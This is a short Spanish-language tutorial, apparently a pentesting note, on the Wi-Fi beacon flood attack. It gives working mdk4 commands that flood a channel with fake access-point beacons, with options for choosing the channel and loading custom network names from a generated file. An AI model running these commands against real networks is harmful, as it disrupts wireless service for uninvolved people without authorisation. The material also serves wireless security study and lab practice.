#  Ataque Beacon Flood

El ataque Beacon Flood se basa en enviar una gran cantidad de paquetes beacon. Estos paquetes son los que emiten los puntos de acceso para que podamos detectarlos. La idea de este ataque es inundar un canal con estos paquetes, saturando la señal del canal y afectando a las demás redes que operan en él.

Para llevar a cabo este ataque vamos a usar la herramienta `mdk4`

`mdk4 wlan0mon b`

![imagen](https://github.com/user-attachments/assets/98b2cea6-b395-4bb9-a9ef-f7de66908694)

Si queremos indicar en que canal se crean los puntos de acceso debemos usar el parámetro `-c`

`mdk4 wlan0mon b -c 5`

![imagen](https://github.com/user-attachments/assets/dad4cd8b-1c52-4b0e-8a45-bddfcd81b0fe)

Si queremos ponerles nombres personalizados a las redes podemos hacerlo pasándole un archivo con distintos nombres de puntos de acceso.

```bash
for i in $(seq 1 10); do echo "wifi $i"; done > nombres.txt
```

`mdk4 wlan0mon b -c 5 -f nombres.txt`

![imagen](https://github.com/user-attachments/assets/b3298ada-0403-4a69-9944-dd29a72e6a99)
